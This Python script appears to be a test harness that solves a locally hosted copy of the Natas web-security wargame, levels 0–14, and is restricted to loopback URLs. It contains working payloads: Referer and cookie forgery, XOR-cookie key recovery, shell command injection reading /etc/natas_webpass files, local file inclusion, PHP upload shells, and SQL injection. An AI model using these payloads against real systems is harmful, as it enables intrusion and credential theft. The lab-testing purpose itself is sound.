#!/usr/bin/env python3
"""Opt-in end-to-end solve audit for local Natas levels 0 through 14.

Run only against an authorized local CEI Labs target. Provide an explicit
loopback target URL and synthetic credentials; this script never contacts a
public target and is not part of the default CI test suite.
"""

import argparse
import base64
import html
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
import uuid


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, request, fp, code, msg, headers, newurl):
        return None


def require(value, message):
    if not value:
        raise AssertionError(message)


def parse_secrets(value):
    secrets = json.loads(value)
    require(isinstance(secrets, dict), "NATAS_AUDIT_SECRETS must be a JSON object")
    for level in range(1, 35):
        require(isinstance(secrets.get(f"natas{level}"), str) and secrets[f"natas{level}"], f"missing synthetic secret natas{level}")
    require(isinstance(secrets.get("natas14final"), str) and secrets["natas14final"], "missing synthetic secret natas14final")
    return secrets


def local_base_url(value):
    parsed = urllib.parse.urlparse(value)
    require(parsed.scheme == "http" and parsed.hostname in {"127.0.0.1", "localhost"}, "--base-url must be an explicit local http URL")
    require(parsed.port is not None and not parsed.path.rstrip("/"), "--base-url must include only a local host and port")
    return value.rstrip("/")


class NatasAudit:
    def __init__(self, base_url, secrets):
        self.base_url = local_base_url(base_url)
        self.secrets = secrets

    def url(self, level, path="/"):
        return f"{self.base_url.rsplit(':', 1)[0]}:{urllib.parse.urlparse(self.base_url).port + level}{path}"

    def request(self, level, path="/", data=None, headers=None, password=None, follow_redirects=True):
        password = self.secrets[f"natas{level}"] if password is None and level else (password or "natas0")
        token = base64.b64encode(f"natas{level}:{password}".encode()).decode()
        request_headers = {"Authorization": f"Basic {token}"}
        request_headers.update(headers or {})
        req = urllib.request.Request(self.url(level, path), data=data, headers=request_headers)
        try:
            opener = urllib.request.build_opener() if follow_redirects else urllib.request.build_opener(NoRedirect)
            with opener.open(req, timeout=10) as response:
                return response.status, response.read(), response.headers
        except urllib.error.HTTPError as error:
            return error.code, error.read(), error.headers

    def form(self, level, fields, path="/index.php", headers=None):
        return self.request(level, path, urllib.parse.urlencode(fields).encode(), {"Content-Type": "application/x-www-form-urlencoded", **(headers or {})})

    def multipart(self, level, filename, content):
        boundary = "----CEIAudit" + uuid.uuid4().hex
        body = (
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload File\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"uploadedfile\"; filename=\"{filename}\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
        return self.request(level, "/index.php", body, {"Content-Type": f"multipart/form-data; boundary={boundary}"})


def xor_bytes(data, key):
    return bytes(value ^ key[index % len(key)] for index, value in enumerate(data))


def expect(audit, level, expected, message, **kwargs):
    status, body, headers = audit.request(level, **kwargs)
    require(status == 200 and expected in body, message)
    return body, headers


def main(base_url, secrets):
    audit = NatasAudit(base_url, secrets)
    # Every vhost rejects bad credentials, while each recovered secret opens the next level.
    for level in range(35):
        status, _, _ = audit.request(level, password="wrong-password")
        require(status == 401, f"Natas {level} accepts wrong credentials")
        status, _, _ = audit.request(level, follow_redirects=False)
        require(status in (200, 302), f"Natas {level} rejects its configured credentials")

    body, _ = expect(audit, 0, secrets["natas1"].encode(), "Natas 0 HTML comment missing")
    require(b"<!--" in body, "Natas 0 secret is not in an HTML comment")
    body, _ = expect(audit, 1, secrets["natas2"].encode(), "Natas 1 HTML comment missing")
    require(b"oncontextmenu" in body and b"<!--" in body, "Natas 1 right-click/comment path missing")

    body, _ = expect(audit, 2, b"files/pixel.png", "Natas 2 image path missing")
    require(secrets["natas3"].encode() not in body, "Natas 2 exposes secret before directory listing")
    body, _ = expect(audit, 2, b"users.txt", "Natas 2 directory listing missing", path="/files/")
    expect(audit, 2, secrets["natas3"].encode(), "Natas 2 users file missing secret", path="/files/users.txt")

    body, _ = expect(audit, 3, b"Disallow: /s3cr3t/", "Natas 3 robots path missing", path="/robots.txt")
    require(secrets["natas4"].encode() not in body, "Natas 3 robots leaks secret directly")
    expect(audit, 3, secrets["natas4"].encode(), "Natas 3 robots-discovered secret missing", path="/s3cr3t/users.txt")

    status, body, _ = audit.request(4)
    require(status == 200 and b"Access disallowed" in body and secrets["natas5"].encode() not in body, "Natas 4 accepts absent referer")
    expect(audit, 4, secrets["natas5"].encode(), "Natas 4 referer bypass failed", headers={"Referer": audit.url(5)})

    status, body, headers = audit.request(5)
    require(status == 200 and b"not logged in" in body and "loggedin=0" in headers.get("Set-Cookie", ""), "Natas 5 default cookie path missing")
    expect(audit, 5, secrets["natas6"].encode(), "Natas 5 cookie bypass failed", headers={"Cookie": "loggedin=1"})

    status, body, _ = audit.form(6, {"secret": "wrong-secret"})
    require(status == 200 and b"Wrong secret" in body and secrets["natas7"].encode() not in body, "Natas 6 rejects no wrong secret")
    body, _ = expect(audit, 6, b"includes/secret.inc", "Natas 6 source include path missing", path="/?source")
    source_text = html.unescape(re.sub(r"<[^>]+>", "", body.decode(errors="replace"))).replace("\xa0", " ")
    include_match = re.search(r'include\s+"([^"]+)"', source_text)
    require(include_match, "Natas 6 source does not expose include filename")
    _, include_body, _ = audit.request(6, "/" + include_match.group(1))
    secret_match = re.search(rb'\$secret = "([^"]+)"', include_body)
    require(secret_match, "Natas 6 include does not expose form secret")
    status, body, _ = audit.form(6, {"secret": secret_match.group(1).decode()})
    require(status == 200 and secrets["natas7"].encode() in body, "Natas 6 include/form chain failed")

    body, _ = expect(audit, 7, b"/etc/natas_webpass/natas8", "Natas 7 HTML source clue missing")
    expect(audit, 7, secrets["natas8"].encode(), "Natas 7 LFI failed", path="/index.php?page=/etc/natas_webpass/natas8")
    body, _ = expect(audit, 8, b"bin2hex", "Natas 8 encoding source missing", path="/?source")
    status, body, _ = audit.form(8, {"secret": "wrong-secret"})
    require(status == 200 and secrets["natas9"].encode() not in body, "Natas 8 accepts wrong secret")
    _, body, _ = audit.request(8)
    match = re.search(rb"Encoded secret:.*?([0-9a-f]{20,})", body, re.DOTALL)
    require(match, "Natas 8 page does not expose encodedSecret")
    form_secret = base64.b64decode(bytes.fromhex(match.group(1).decode())[::-1]).decode()
    status, body, _ = audit.form(8, {"secret": form_secret})
    require(status == 200 and secrets["natas9"].encode() in body, "Natas 8 decoding chain failed")

    expect(audit, 9, secrets["natas10"].encode(), "Natas 9 command injection failed", path="/index.php?" + urllib.parse.urlencode({"needle": ";cat /etc/natas_webpass/natas10"}))
    expect(audit, 10, secrets["natas11"].encode(), "Natas 10 grep injection failed", path="/index.php?" + urllib.parse.urlencode({"needle": ". /etc/natas_webpass/natas11 #"}))

    _, _, headers = audit.request(11)
    cookie = next(morsel.split(";", 1)[0].split("=", 1)[1] for morsel in headers.get_all("Set-Cookie", []) if morsel.startswith("data="))
    known = b'{"showpassword":"no","bgcolor":"#ffffff"}'
    key = bytes(left ^ right for left, right in zip(base64.b64decode(urllib.parse.unquote(cookie)), known))[:4]
    forged = urllib.parse.quote(base64.b64encode(xor_bytes(b'{"showpassword":"yes","bgcolor":"#ffffff"}', key)).decode())
    expect(audit, 11, secrets["natas12"].encode(), "Natas 11 XOR cookie forgery failed", headers={"Cookie": f"data={forged}"})

    _, body, _ = audit.multipart(12, "audit.php", b'<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>')
    require(b"uploads/audit.php" in body, "Natas 12 upload failed")
    expect(audit, 12, secrets["natas13"].encode(), "Natas 12 uploaded PHP did not execute", path="/uploads/audit.php")
    _, body, _ = audit.multipart(13, "audit.php", b'GIF89a<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>')
    require(b"uploads/audit.php" in body, "Natas 13 magic-byte upload failed")
    expect(audit, 13, secrets["natas14"].encode(), "Natas 13 uploaded PHP did not execute", path="/uploads/audit.php")
    status, body, _ = audit.form(14, {"username": '" OR "1"="1" -- ', "password": "x"})
    require(status == 200 and secrets["natas14final"].encode() in body, "Natas 14 SQL injection failed")
    print("NATAS_LEVELS_0_THROUGH_14_OK")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True, help="explicit local level-0 URL, such as http://127.0.0.1:18000")
    parser.add_argument("--secrets", required=True, help="JSON object containing synthetic natas1..natas34 values and the deployed natas14final")
    args = parser.parse_args()
    try:
        main(args.base_url, parse_secrets(args.secrets))
    except (AssertionError, urllib.error.URLError, ValueError, KeyError) as error:
        print(f"NATAS_AUDIT_FAILED: {error}", file=sys.stderr)
        raise SystemExit(1)
